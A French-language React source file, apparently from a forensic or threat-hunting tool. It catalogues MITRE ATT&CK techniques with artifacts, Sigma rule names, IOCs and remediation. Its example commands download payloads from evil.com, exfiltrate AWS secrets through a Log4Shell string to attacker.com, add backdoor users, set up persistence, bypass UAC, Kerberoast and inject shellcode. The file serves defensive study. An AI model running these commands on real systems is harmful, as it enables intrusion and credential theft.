import { useState, useMemo } from 'react';
import { Copy, CheckCheck, ChevronDown, ChevronRight, AlertTriangle, Shield, Users, Bug } from 'lucide-react';
import { useTheme } from '../../utils/theme';

function CopyBtn({ text }) {
  const [ok, setOk] = useState(false);
  return (
    <button onClick={() => { navigator.clipboard.writeText(text).then(() => { setOk(true); setTimeout(() => setOk(false), 1800); }); }}
      title="Copier"
      style={{
        display: 'inline-flex', alignItems: 'center', gap: 3,
        padding: '2px 6px', borderRadius: 4, cursor: 'pointer',
        fontSize: 9, fontFamily: 'monospace', flexShrink: 0,
        background: ok ? '#22c55e18' : 'var(--fl-card)',
        color: ok ? '#22c55e' : 'var(--fl-dim)',
        border: `1px solid ${ok ? '#22c55e40' : 'var(--fl-border)'}`,
      }}>
      {ok ? <CheckCheck size={9} /> : <Copy size={9} />}
    </button>
  );
}

function MitreBadge({ id }) {
  return (
    <span style={{
      fontFamily: 'monospace', fontSize: 9, fontWeight: 700, whiteSpace: 'nowrap',
      padding: '1px 5px', borderRadius: 3,
      background: 'color-mix(in srgb, var(--fl-accent) 15%, transparent)',
      color: 'var(--fl-accent)',
      border: '1px solid color-mix(in srgb, var(--fl-accent) 35%, transparent)',
    }}>{id}</span>
  );
}

function TacticBadge({ tactic }) {
  const colors = {
    'Initial Access':       '#f97316',
    'Execution':            '#eab308',
    'Persistence':          '#a855f7',
    'Privilege Escalation': '#ec4899',
    'Defense Evasion':      '#06b6d4',
    'Credential Access':    '#ef4444',
    'Discovery':            '#84cc16',
    'Lateral Movement':     '#f59e0b',
    'Collection':           '#10b981',
    'Command & Control':    '#3b82f6',
    'Exfiltration':         '#8b5cf6',
    'Impact':               '#dc2626',
  };
  const c = colors[tactic] || '#94a3b8';
  return (
    <span style={{
      fontFamily: 'monospace', fontSize: 8, fontWeight: 700, whiteSpace: 'nowrap',
      padding: '1px 5px', borderRadius: 3,
      background: `${c}18`, color: c, border: `1px solid ${c}40`,
    }}>{tactic}</span>
  );
}

const PATTERNS = [
  // ─── INITIAL ACCESS ────────────────────────────────────────────────────────
  {
    id: 'phishing-macro',
    tactic: 'Initial Access',
    title: 'Phishing — Macro Office / Pièce jointe malveillante',
    icon: '📧',
    severity: 'critical',
    ttps: ['T1566.001', 'T1059.001', 'T1059.005'],
    apt: ['APT28 (Fancy Bear)', 'APT29 (Cozy Bear)', 'TA505', 'Lazarus Group'],
    malware: ['Emotet', 'QakBot', 'AgentTesla', 'FormBook', 'Dridex'],
    summary: "Email avec pièce jointe malveillante (macro Office, PDF, ISO/VHD) exécutant un stager PowerShell ou VBScript. Vecteur d'entrée #1 en entreprise.",
    artifacts: [
      { type: 'EVTX Security', items: ['4688 — WINWORD.EXE → cmd.exe / powershell.exe (parent-child anormal)', '4104 — PowerShell ScriptBlock logging : contenu stager décodé', '4103 — Module logging PowerShell'] },
      { type: 'EVTX Office', items: ['Microsoft Office Alerts/16.0 — macro bloquée ou exécutée'] },
      { type: 'Prefetch', items: ['WINWORD.EXE, EXCEL.EXE — date première exécution', 'Stager dans %TEMP% — nom généré (ex: tmp4A3F.exe)'] },
      { type: 'AmCache', items: ['SHA1 du binaire déposé → recherche VirusTotal / NSRL'] },
      { type: 'MFT / $USNJrnl', items: ['Création dans %TEMP%, %APPDATA%\\Roaming, %USERPROFILE%\\Downloads', 'Fichiers .docm, .xlsm, .js, .hta, .vbs créés puis supprimés'] },
      { type: 'Zone.Identifier ADS', items: ['ZoneId=3 (Internet) sur la pièce jointe', "Chemin de l'email source dans le flux de données alternatif"] },
    ],
    commands: [
      'powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA==',
      'cmd.exe /c certutil.exe -decode payload.txt payload.exe',
      'mshta.exe http://evil.com/payload.hta',
      'wscript.exe //B //NoLogo dropper.vbs',
    ],
    sigma: ['win_office_spawn_process', 'win_powershell_encoded_param', 'win_susp_certutil_decode', 'win_mshta_spawn_shell'],
    iocs: ['Processus Office en parent de cmd.exe / powershell.exe', 'PowerShell avec -enc, -EncodedCommand, -nop, -sta', 'Connexion réseau depuis WINWORD.EXE / EXCEL.EXE', 'Fichier .exe dans %TEMP% immédiatement après ouverture pièce jointe'],
    remediation: ['Désactiver les macros via GPO (BlockMacros=1)', 'Activer Protected View pour les documents Internet', 'PowerShell Constrained Language Mode', 'EDR avec règle parent-process Office → shell'],
  },
  {
    id: 'phishing-link',
    tactic: 'Initial Access',
    title: 'Spearphishing Link — Credential Harvesting / AiTM',
    icon: '🔗',
    severity: 'high',
    ttps: ['T1566.002', 'T1189', 'T1056.003'],
    apt: ['APT29', 'APT32 (OceanLotus)', 'TA453', 'Nobelium'],
    malware: ['EvilGinx2', 'Modlishka', 'GoPhish'],
    summary: "Lien vers faux portail (Microsoft 365, VPN, webmail) collectant les identifiants. Variante avancée : reverse proxy interceptant les sessions MFA (Adversary-in-the-Middle).",
    artifacts: [
      { type: 'Navigateur', items: ['History, Cookies, Cache : URL de phishing, redirection', 'Session cookies volés (format JWT ou cookies de session)'] },
      { type: 'Azure AD / Sign-in Logs', items: ['Sign-in depuis IP étrangère juste après le clic', 'MFA satisfied mais session utilisée depuis nouvel IP (AiTM)', 'Impossible Travel alert'] },
      { type: 'DNS', items: ['Requête vers domaine enregistré récemment (< 30j)', 'Homoglyphe ou typosquat (micros0ft.com, 0ffice365.com)'] },
      { type: 'Proxy / Firewall', items: ['GET vers URL avec paramètres de tracking', 'Redirect chain : email légitime → bit.ly → phishing domain'] },
    ],
    sigma: ['azure_signin_impossible_travel', 'proxy_phishing_domain', 'win_browser_credential_access'],
    iocs: ['Connexion Azure depuis IP jamais vue pour cet utilisateur', 'Session token utilisé depuis 2 IP différentes simultanément', "Domaine < 30 jours, certificat Let's Encrypt", 'URL avec path imitant /login, /auth, /o365'],
    remediation: ['Conditional Access sur Azure AD (IP, device compliance)', 'FIDO2 / Passkeys (résistent à AiTM)', 'Microsoft Defender for Office 365 Safe Links', 'Sensibilisation utilisateurs'],
  },
  {
    id: 'exploit-public',
    tactic: 'Initial Access',
    title: "Exploitation d'Application Exposée (RCE)",
    icon: '💥',
    severity: 'critical',
    ttps: ['T1190', 'T1133'],
    apt: ['APT41', 'Hafnium', 'BlackCat/ALPHV', 'Cl0p'],
    malware: ['China Chopper webshell', 'HAFNIUM webshell', 'Meterpreter'],
    summary: "Exploitation d'une vulnérabilité sur service exposé (Exchange, VPN, Citrix, Log4j, MOVEit). Permet une RCE directe sans interaction utilisateur.",
    artifacts: [
      { type: 'Web Logs (IIS/Apache)', items: ['POST vers /autodiscover, /ews, /ecp (Exchange — ProxyLogon/ProxyShell)', 'Payload dans User-Agent, Cookie, ou corps de requête HTTP', 'Réponse 200 sur endpoint normalement non accessible', 'Directory traversal : ../../../../etc/passwd dans URI'] },
      { type: 'EVTX Application', items: ['Crash de processus serveur (Application Error)', 'MSExchangeTransport erreurs après tentative'] },
      { type: 'MFT', items: ['Webshell déposé : .aspx, .jsp, .php dans répertoire web', 'Fichier < 2 KB avec exécution de commandes via HTTP'] },
      { type: 'Prefetch', items: ['w3wp.exe, java.exe spawne cmd.exe / powershell.exe'] },
    ],
    commands: [
      '# Log4Shell (CVE-2021-44228)',
      '${jndi:ldap://attacker.com/${env:AWS_SECRET_ACCESS_KEY}}',
      '# ProxyShell — 3 étapes (CVE-2021-34473/34523/31207)',
      'POST /autodiscover/autodiscover.json?@evil.com/autodiscover/autodiscover.json',
      '# Webshell ASPX (China Chopper) — exécute commandes OS via POST param',
      '# Pattern : <%@ Page Language="Jscript"%>  [execute OS cmd from HTTP param]',
    ],
    sigma: ['win_webshell_spawn', 'win_iis_susp_process_spawn', 'web_log4j_jndi_injection'],
    iocs: ['w3wp.exe / java.exe spawne cmd.exe', 'Fichier .aspx/.jsp créé dans répertoire wwwroot', 'Requête HTTP avec ${jndi:, ../../../../, ;${', 'POST sur /ecp avec payload XML malformé'],
    remediation: ['Patching immédiat CVE critiques (SLA < 72h)', 'WAF avec règles OWASP CRS', 'Segmentation DMZ — pas accès direct intranet', 'Monitoring w3wp.exe child processes'],
  },
  {
    id: 'supply-chain',
    tactic: 'Initial Access',
    title: 'Supply Chain Compromise',
    icon: '📦',
    severity: 'critical',
    ttps: ['T1195.002', 'T1195.001'],
    apt: ['APT29 (SolarWinds)', 'Lazarus (3CX)', 'Cl0p (MOVEit)'],
    malware: ['SUNBURST', 'SUNSPOT', 'SolarWinds.BusinessLayerHost.exe trojanisé'],
    summary: "Compromission d'un logiciel tiers de confiance (SolarWinds Orion, 3CX, CCleaner) pour atteindre les clients via des mises à jour légitimes et signées.",
    artifacts: [
      { type: 'Processus', items: ['Binaire légitime signé se comportant comme C2 (DNS beaconing)', 'SolarWinds.BusinessLayerHost.exe avec trafic réseau inhabituel'] },
      { type: 'Réseau / DNS', items: ['Résolution DGA depuis binaire légitime (avsvmcloud.com pour SolarWinds)', 'Trafic vers domaines inconnus depuis binaire normalement silencieux'] },
      { type: 'Fichiers', items: ['Hash du binaire différent du hash officiel éditeur', 'DLL patchée avec taille légèrement différente'] },
    ],
    sigma: ['win_solarwinds_backdoor', 'net_dns_dga_detection', 'win_susp_dll_loaded_by_legit_process'],
    iocs: ['Hash binaire différent de la référence officielle', 'Binaire signé faisant des requêtes DNS vers domaines inconnus', 'Communication à des heures fixes (sleeping implant)', 'Processus légitime avec connexions vers IPs résidentielles'],
    remediation: ['Software Bill of Materials (SBOM)', 'Vérification hash avant tout déploiement', 'Network behavior baseline de tous les binaires légitimes', 'Least privilege pour agents de supervision'],
  },

  // ─── EXECUTION ─────────────────────────────────────────────────────────────
  {
    id: 'powershell-malicious',
    tactic: 'Execution',
    title: 'PowerShell — Obfuscation & Stager en Mémoire',
    icon: '⚡',
    severity: 'critical',
    ttps: ['T1059.001', 'T1027', 'T1140'],
    apt: ['APT29', 'APT32', 'FIN7', 'Cobalt Group'],
    malware: ['Empire', 'PowerSploit', 'Invoke-Mimikatz', 'Nishang'],
    summary: "PowerShell est le couteau suisse des attaquants post-exploitation : obfuscation Base64, téléchargement de stager, reflective loading. Fonctionne en mémoire sans écriture disque.",
    artifacts: [
      { type: 'EVTX PowerShell', items: ['4104 — ScriptBlock Logging : contenu décodé (même obfusqué)', '4103 — Module Logging : appels de fonctions', '400/403 — Engine lifecycle (début/fin session PS)'] },
      { type: 'ConsoleHost_history.txt', items: ['%APPDATA%\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'] },
      { type: 'Prefetch', items: ['powershell.exe, powershell_ise.exe — arguments dans les 8 premières références'] },
      { type: 'Mémoire', items: ['Segments RWX dans processus powershell.exe (reflective injection)', 'Strings décodées dans la heap : URLs, commandes, DLLs'] },
    ],
    commands: [
      'powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA==',
      'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/ps.ps1")',
      'iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64)))',
      '[Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, $buf.Length)',
    ],
    sigma: ['win_powershell_encoded_param', 'win_powershell_download_cradle', 'win_powershell_suspicious_keywords', 'win_powershell_amsi_bypass'],
    iocs: ['-enc, -EncodedCommand, -e avec longue chaîne Base64', 'Net.WebClient, Invoke-WebRequest vers IP ou domaine externe', 'IEX / Invoke-Expression avec données dynamiques', 'Add-Type avec P/Invoke (VirtualAlloc, CreateThread)', 'powershell.exe depuis %TEMP% ou sous-processus Office'],
    remediation: ['PowerShell v5+ ScriptBlock Logging obligatoire (GPO)', 'PowerShell Constrained Language Mode (CLM)', 'AMSI activé + EDR récent', 'AppLocker / WDAC pour bloquer PS depuis %TEMP%'],
  },
  {
    id: 'lolbas',
    tactic: 'Execution',
    title: 'LOLBAS — Living off the Land Binaries',
    icon: '🏴',
    severity: 'high',
    ttps: ['T1218', 'T1218.005', 'T1218.010', 'T1218.011', 'T1216'],
    apt: ['APT41', 'FIN7', 'Lazarus', 'TA505'],
    malware: ['Cobalt Strike', 'Metasploit', 'Empire'],
    summary: "Utilisation de binaires Microsoft légitimes et signés pour exécuter du code malveillant, contournant l'application whitelisting et les AV basés sur les signatures.",
    artifacts: [
      { type: 'EVTX Security', items: ['4688 — ligne de commande complète avec arguments suspects', '4104 — si mshta/wscript spawne PowerShell'] },
      { type: 'Prefetch', items: ['mshta.exe, regsvr32.exe, rundll32.exe, certutil.exe, wmic.exe avec arguments'] },
      { type: 'MFT', items: ['Fichiers temporaires créés par les LOLBAS (scripts, DLLs, SCT files)'] },
      { type: 'Réseau', items: ['certutil.exe, bitsadmin.exe, desktopimgdownldr.exe faisant des requêtes HTTP'] },
    ],
    commands: [
      "mshta.exe vbscript:Execute(\"CreateObject('WScript.Shell').Run('cmd /c ...',0,True)(window.close)\")",
      'regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll',
      'certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\p.exe',
      'msiexec.exe /quiet /i http://evil.com/malicious.msi',
      'desktopimgdownldr.exe /lockscreenurl:http://evil.com/p.exe /eventName:desktopimgdownldr',
      'rundll32.exe C:\\Windows\\System32\\davclnt.dll,DavSetCookie http://evil.com/payload',
    ],
    sigma: ['win_mshta_spawn_shell', 'win_regsvr32_network_activity', 'win_certutil_url_decode', 'win_susp_rundll32_activity'],
    iocs: ['certutil.exe avec -urlcache ou -decode', 'mshta.exe avec URL ou vbscript:', 'regsvr32.exe faisant du réseau (Squiblydoo)', 'msiexec.exe avec URL distante'],
    remediation: ["AppLocker / WDAC : bloquer mshta, regsvr32 depuis Internet", 'Sinkhole DNS pour FQDN C2 connus', 'Network detection : binaires signés MS faisant du HTTP'],
  },
  {
    id: 'wmi-exec',
    tactic: 'Execution',
    title: 'WMI — Exécution Locale et Distante',
    icon: '🕷️',
    severity: 'critical',
    ttps: ['T1047', 'T1546.003'],
    apt: ['APT28', 'APT29', 'Hafnium', 'FIN7'],
    malware: ['WMISPY', 'PowerSploit WMI', 'CobaltStrike wmiexec'],
    summary: "WMI permet l'exécution distante de commandes, la collecte d'informations système et la persistance via abonnements d'événements. Très discret car peu loggué par défaut.",
    artifacts: [
      { type: 'WMI Repository', items: ['C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA — abonnements persistants', 'Analyser avec python-cim ou WMI-forensics.py'] },
      { type: 'EVTX WMIActivity', items: ['5857, 5858 — query WMI', '5860 — abonnement créé', '5861 — CRITIQUE : abonnement permanent enregistré'] },
      { type: 'EVTX Security', items: ['4688 — wmiprvse.exe spawne cmd.exe / powershell.exe'] },
      { type: 'EVTX DistributedCOM', items: ['10021, 10028 — connexions DCOM (WMI distant)'] },
    ],
    commands: [
      'wmic /node:<IP> /user:DOM\\user /password:pass process call create "cmd /c net user hacker P@ss /add"',
      'wmic process call create "powershell -enc <b64>"',
      '# Abonnement persistant WMI (survit au reboot)',
      '$F = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{...}',
      '$C = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{CommandLineTemplate="cmd /c ..."}',
      'Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$F;Consumer=$C}',
    ],
    sigma: ['win_wmi_persistence', 'win_wmiprvse_spawn_shell', 'win_wmi_remote_process_create'],
    iocs: ['wmiprvse.exe spawne cmd.exe / powershell.exe', 'wmic.exe avec /node: (connexion distante)', '__EventFilter + CommandLineEventConsumer dans repository WMI', 'mofcomp.exe exécuté par processus non-système'],
    remediation: ['Auditer abonnements WMI : Get-WMIObject -Namespace root\\subscription', 'Désactiver WMI distant si non nécessaire (DCOM restriction)', 'Sysmon EventID 19/20/21 pour WMI activity'],
  },

  // ─── PERSISTENCE ───────────────────────────────────────────────────────────
  {
    id: 'persistence-task',
    tactic: 'Persistence',
    title: 'Persistance — Tâche Planifiée',
    icon: '⏰',
    severity: 'high',
    ttps: ['T1053.005'],
    apt: ['APT28', 'TA505', 'FIN6', 'Lazarus'],
    malware: ['QakBot', 'Emotet', 'TrickBot', 'Dridex'],
    summary: "Création d'une tâche planifiée pour maintenir la persistance avec ou sans privilèges admin. Mécanisme fréquemment utilisé car peu surveillé.",
    artifacts: [
      { type: 'EVTX Security', items: ['4698 — tâche créée (XML complet inclus)', '4699 — supprimée', '4700/4701 — activée/désactivée', '4702 — modifiée'] },
      { type: 'EVTX TaskScheduler', items: ['106 — tâche enregistrée', '200 — action lancée', '201 — action complétée', '140 — tâche mise à jour'] },
      { type: 'Fichiers', items: ['C:\\Windows\\System32\\Tasks\\ — XML de la tâche', 'C:\\Windows\\SysWOW64\\Tasks\\ — tâches 32-bit'] },
      { type: 'Registre', items: ['HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks', 'HKLM\\...\\Schedule\\TaskCache\\Tree'] },
    ],
    commands: [
      'schtasks /create /tn "MicrosoftEdgeUpdate" /tr "powershell -w hidden -enc <b64>" /sc ONLOGON /ru SYSTEM',
      'schtasks /create /tn "WindowsDefender" /tr "C:\\Temp\\evil.exe" /sc DAILY /st 02:00',
      '# Via COM object (plus discret que schtasks.exe)',
      '$scheduler = New-Object -ComObject Schedule.Service',
    ],
    sigma: ['win_schtask_creation_by_user', 'win_schtask_susp_path', 'win_schtask_lateral_movement'],
    iocs: ['Nom imitant service Microsoft (WindowsDefender, MicrosoftEdgeUpdate)', 'Chemin exécutable dans %TEMP%, %APPDATA% ou C:\\Users\\Public', 'Trigger ONLOGON ou ONIDLE avec commande encodée', 'Tâche créée par processus non attendu'],
    remediation: ['Audit régulier : schtasks /query /fo LIST /v', 'WDAC pour restreindre binaires depuis %TEMP%', 'Sysmon EventID 1 avec parent svchost.exe -k Schedule'],
  },
  {
    id: 'persistence-service',
    tactic: 'Persistence',
    title: 'Persistance — Service Windows',
    icon: '⚙️',
    severity: 'high',
    ttps: ['T1543.003'],
    apt: ['APT28', 'APT41', 'FIN7'],
    malware: ['Cobalt Strike', 'PlugX', 'Metasploit PSEXEC'],
    summary: "Installation d'un service Windows malveillant pour exécution au démarrage avec privilèges SYSTEM.",
    artifacts: [
      { type: 'EVTX Security', items: ['4697 — service installé (ImagePath, ServiceType, StartType)'] },
      { type: 'EVTX System', items: ['7045 — nouveau service installé', '7034 — service terminé de façon inattendue', '7040 — StartType modifié'] },
      { type: 'Registre', items: ['HKLM\\SYSTEM\\CurrentControlSet\\Services\\<nom_service>', 'Clés : ImagePath, DisplayName, Description, ObjectName, Type, Start'] },
      { type: 'Fichiers', items: ['Binaire copié dans %SystemRoot% ou %SystemRoot%\\Temp', 'Vérifier signature et hash'] },
    ],
    sigma: ['win_service_creation_susp_binary', 'win_new_service_installation', 'win_sc_create_service'],
    iocs: ['ImagePath vers %TEMP%, %APPDATA%, C:\\Users\\Public', 'Nom aléatoire ou imitant (svchost32, WindowsDefenderSvc)', 'ObjectName = LocalSystem sur service récemment installé'],
    remediation: ['Audit HKLM\\SYSTEM\\CurrentControlSet\\Services — baseline + delta', 'sc query type= all pour comparaison', 'Sysmon EventID 6 (Driver Load) pour services kernel'],
  },
  {
    id: 'registry-run',
    tactic: 'Persistence',
    title: 'Persistance — Registry Run Keys',
    icon: '🗝️',
    severity: 'medium',
    ttps: ['T1547.001', 'T1547.009'],
    apt: ['APT1', 'APT28', 'Gamaredon', 'Lazarus'],
    malware: ['njRAT', 'AsyncRAT', 'Remcos', 'NanoCore', 'DarkComet'],
    summary: "Ajout d'une valeur dans les clés Run/RunOnce du registre pour exécuter un payload au démarrage/logon. Mécanisme classique des RATs et keyloggers.",
    artifacts: [
      { type: 'Registre', items: [
        'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
        'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
        'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
        'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
        'HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run',
        'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute',
      ]},
      { type: 'EVTX Security', items: ['4657 — modification valeur registre (si audit activé)', '4688 — processus lancé via Run key (parent = userinit.exe ou explorer.exe)'] },
      { type: 'AmCache / ShimCache', items: ['Binaire exécuté au logon — trace même sans prefetch'] },
    ],
    commands: [
      'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "C:\\Users\\Public\\svchost.exe"',
      'Set-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -Name "Updater" -Value "powershell -w hidden -enc ..."',
    ],
    sigma: ['win_registry_run_key_creation', 'win_reg_run_susp_value'],
    iocs: ['Valeur Run pointant vers %TEMP%, %APPDATA%, C:\\Users\\Public', 'Chemin contenant powershell.exe, wscript.exe, mshta.exe', 'Valeur ajoutée hors fenêtre de déploiement logiciel'],
    remediation: ['Sysmon EventID 13 : modifications Run/RunOnce', 'Autoruns (SysInternals) en audit quotidien', 'GPO : restreindre modification HKLM\\Run aux admins'],
  },
  {
    id: 'dll-hijack',
    tactic: 'Persistence',
    title: 'DLL Hijacking / Side-Loading',
    icon: '🔧',
    severity: 'high',
    ttps: ['T1574.001', 'T1574.002'],
    apt: ['APT10', 'APT41', 'Lazarus', 'PlugX operators'],
    malware: ['PlugX', 'ShadowPad', 'Winnti'],
    summary: "Placement d'une DLL malveillante dans un répertoire prioritaire (DLL search order hijacking) ou aux côtés d'un exécutable légitime chargeant une DLL inexistante.",
    artifacts: [
      { type: 'EVTX Sysmon', items: ['7 — ImageLoaded : DLL chargée depuis chemin anormal', '1 — ProcessCreate : binaire légitime avec DLL malveillante'] },
      { type: 'MFT', items: ['DLL créée dans répertoire applicatif ou %TEMP%', 'DLL avec nom Windows légitime (version.dll, apphelp.dll, dwmapi.dll)'] },
      { type: 'Module list', items: ['DLL légitime et malveillante avec même nom mais chemins différents', 'DLL non signée dans processus signé'] },
    ],
    sigma: ['win_sysmon_dll_loaded_non_sys32', 'win_susp_dll_hijack_base'],
    iocs: ['DLL Windows chargée depuis répertoire non-System32', 'DLL non signée dans processus signé Microsoft', 'version.dll, apphelp.dll, dwmapi.dll dans répertoire applicatif'],
    remediation: ['Activer KnownDLLs dans le registre', 'Binaires dans Program Files (protégé en écriture)', 'Sysmon EventID 7 avec filtre non-System32 + non signé'],
  },

  // ─── PRIVILEGE ESCALATION ──────────────────────────────────────────────────
  {
    id: 'token-impersonation',
    tactic: 'Privilege Escalation',
    title: 'Token Impersonation (Potato Attacks)',
    icon: '👑',
    severity: 'critical',
    ttps: ['T1134', 'T1134.001', 'T1134.002'],
    apt: ['APT28', 'FIN7', 'Cobalt Group'],
    malware: ['JuicyPotato', 'PrintSpoofer', 'RoguePotato', 'GodPotato'],
    summary: "Vol et impersonation de tokens Windows pour escalader depuis un compte de service (IIS, SQL) vers SYSTEM. Exploite SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege.",
    artifacts: [
      { type: 'EVTX Security', items: ['4688 — JuicyPotato.exe, PrintSpoofer.exe dans la ligne de commande', '4672 — SeDebugPrivilege ou SeImpersonatePrivilege assigné', '4624 Type 3 — logon réseau après impersonation'] },
      { type: 'Prefetch', items: ['JuicyPotato.exe, PrintSpoofer.exe, GodPotato.exe'] },
      { type: 'Mémoire', items: ['Thread avec token différent du processus parent', 'Handles ouverts sur LSASS avec GrantedAccess 0x1fffff'] },
    ],
    commands: [
      'JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t * -c {CLSID}',
      'PrintSpoofer.exe -i -c cmd',
      'RoguePotato.exe -r attacker_ip -e "cmd.exe"',
      'GodPotato.exe -cmd "cmd /c whoami"',
    ],
    sigma: ['win_privesc_juicy_potato', 'win_susp_token_manipulation', 'win_printspoofer_execution'],
    iocs: ['JuicyPotato, PrintSpoofer dans prefetch', 'Processus IIS/SQL Server avec token SYSTEM', 'SeDebugPrivilege activé sur compte non-admin'],
    remediation: ['Retirer SeImpersonatePrivilege des comptes de service applicatifs', 'Protected Process Light (PPL) pour LSASS', 'GMSA (Group Managed Service Accounts)'],
  },
  {
    id: 'kerberoasting',
    tactic: 'Privilege Escalation',
    title: 'Kerberoasting / AS-REP Roasting',
    icon: '🍺',
    severity: 'critical',
    ttps: ['T1558.003', 'T1558.004'],
    apt: ['APT29', 'FIN7', 'Evil Corp'],
    malware: ['Rubeus', 'Impacket GetUserSPNs', 'PowerSploit Invoke-Kerberoast'],
    summary: "Kerberoasting : demande de TGS pour des SPN de comptes de service, puis crackage offline. AS-REP Roasting : ciblage des comptes sans pré-auth Kerberos requise.",
    artifacts: [
      { type: 'EVTX Security (DC)', items: ['4769 — TGS Request : EncryptionType = 0x17 (RC4) en volume élevé', '4768 — AS-REQ sans pré-authentification (AS-REP Roasting)'] },
      { type: 'Réseau', items: ['Nombreuses requêtes TGS en peu de temps depuis même IP', 'Requêtes pour SPNs inhabituels (MSSQLSvc, HTTP/intranet...)'] },
      { type: 'Prefetch', items: ['rubeus.exe, GetUserSPNs (via Python/WSL)'] },
    ],
    commands: [
      'Rubeus.exe kerberoast /outfile:hashes.txt',
      'GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request',
      'Rubeus.exe asreproast /format:hashcat',
      'GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip DC_IP',
      'hashcat -m 13100 hashes.txt rockyou.txt --force',
    ],
    sigma: ['win_multiple_tgs_requests_rc4', 'win_asrep_roasting_detection'],
    iocs: ['Volume élevé EventID 4769 avec EncryptionType = 0x17 (RC4)', 'Requêtes TGS depuis compte qui ne se connecte pas normalement à ces services', 'Multiple TGS pour différents SPNs en quelques secondes'],
    remediation: ['Comptes de service avec mots de passe > 30 chars (GMSA recommandé)', 'Migrer vers AES-256 (désactiver RC4 pour TGS)', 'Activer pré-authentification Kerberos sur TOUS les comptes', 'Protected Users Security Group pour les admins'],
  },
  {
    id: 'uac-bypass',
    tactic: 'Privilege Escalation',
    title: 'UAC Bypass',
    icon: '🛡️',
    severity: 'high',
    ttps: ['T1548.002'],
    apt: ['APT28', 'FIN7', 'Turla'],
    malware: ['Empire UACBypass', 'Cobalt Strike', 'Metasploit UACBypass'],
    summary: "Contournement du User Account Control pour passer de medium à high integrity sans prompt. Exploite des exécutables auto-elevate (fodhelper, eventvwr, sdclt).",
    artifacts: [
      { type: 'EVTX Security', items: ['4688 — processus high-integrity sans prompt UAC', '4703 — privilèges ajoutés au token'] },
      { type: 'Registre', items: ['HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command (fodhelper bypass)', 'HKCU\\Environment\\windir ou systemroot (env bypass)'] },
      { type: 'Prefetch', items: ['eventvwr.exe, fodhelper.exe, diskcleanup.exe exécutés de façon inhabituelle'] },
    ],
    commands: [
      '# Fodhelper bypass (Windows 10)',
      'New-Item "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force',
      'Set-ItemProperty ... -Name "(default)" -Value "cmd /c <payload>"',
      'Start-Process "C:\\Windows\\System32\\fodhelper.exe"',
    ],
    sigma: ['win_uac_bypass_fodhelper', 'win_uac_bypass_eventvwr', 'win_uac_bypass_sdclt'],
    iocs: ['fodhelper.exe, eventvwr.exe, sdclt.exe spawne processus non attendu', 'Modifications HKCU\\Software\\Classes\\ms-settings', 'Shell.Application COM object invoqué depuis PowerShell'],
    remediation: ['Mettre UAC sur "Toujours notifier" (niveau 4)', 'Comptes admin dédiés, jamais utilisés au quotidien', 'Désactiver les auto-elevate inutiles via GPO'],
  },

  // ─── DEFENSE EVASION ───────────────────────────────────────────────────────
  {
    id: 'process-injection',
    tactic: 'Defense Evasion',
    title: 'Process Injection (DLL, Shellcode, PE Hollowing)',
    icon: '💉',
    severity: 'critical',
    ttps: ['T1055', 'T1055.001', 'T1055.002', 'T1055.012'],
    apt: ['APT29', 'APT41', 'Lazarus', 'FIN7'],
    malware: ['Cobalt Strike Beacon', 'Meterpreter', 'Empire', 'SUNBURST'],
    summary: "Injection de code dans un processus légitime (explorer.exe, svchost.exe) pour masquer l'exécution malveillante et contourner les AV/EDR basés sur les processus.",
    artifacts: [
      { type: 'EVTX Sysmon', items: ['8 — CreateRemoteThread : thread créé dans un autre processus', '10 — ProcessAccess : GrantedAccess élevé vers processus cible', '7 — ImageLoaded : DLL dans processus cible'] },
      { type: 'Mémoire', items: ['Région RWX (Read-Write-Execute) dans processus légitime', 'PE Header dans la heap (reflective loading)', 'Threads sans image backing (anonymous memory)', 'vol3 windows.malfind — PE headers en zones non légitimes'] },
      { type: 'API calls (ETW)', items: ['VirtualAllocEx + WriteProcessMemory + CreateRemoteThread', 'NtMapViewOfSection + NtCreateThreadEx (process hollowing)', 'QueueUserAPC (APC injection)'] },
    ],
    commands: [
      '# Classic Shellcode Injection — pattern API Win32',
      'VirtualAllocEx(hProcess, 0, shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE)',
      'WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out _)',
      'CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out _)',
    ],
    sigma: ['win_susp_remote_thread_creation', 'win_sysmon_process_access_lsass', 'win_process_hollowing'],
